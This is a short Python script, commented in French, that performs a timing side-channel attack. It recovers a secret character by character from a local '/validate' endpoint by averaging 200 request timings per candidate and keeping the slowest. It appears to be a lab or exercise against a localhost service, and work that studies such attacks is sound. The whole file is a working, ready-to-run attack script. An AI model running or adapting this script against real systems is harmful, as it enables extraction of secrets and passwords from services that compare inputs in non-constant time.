import time
import string
import requests

def perform_attack():
    url = "http://127.0.0.1:5000/validate"
    extracted = ""
    num_attempts = 200  # Nombre de tentatives pour chaque caractère

    while True:  # Continue jusqu'à ce que le secret soit découvert
        max_avg_time = 0
        next_char = ''

        for char in string.ascii_letters + string.digits:  # Tester les caractères alphanumériques
            test_input = extracted + char
            total_time = 0

            # Effectuer plusieurs requêtes pour calculer une moyenne
            for _ in range(num_attempts):
                start = time.perf_counter()
                response = requests.get(url, params={"input": test_input})
                elapsed = time.perf_counter() - start
                total_time += elapsed

            avg_time = total_time / num_attempts  # Calcul de la moyenne
            print(char, avg_time)
            if avg_time > max_avg_time:
                max_avg_time = avg_time
                next_char = char

        extracted += next_char
        print(f"Extracted so far: {extracted}")

        # Vérifier si le secret est entièrement découvert
        response = requests.get(url, params={"input": extracted})
        if response.status_code == 200:
            print(f"Secret fully discovered: {extracted}")
            break

if __name__ == "__main__":
    print("Starting the attack...")
    perform_attack()
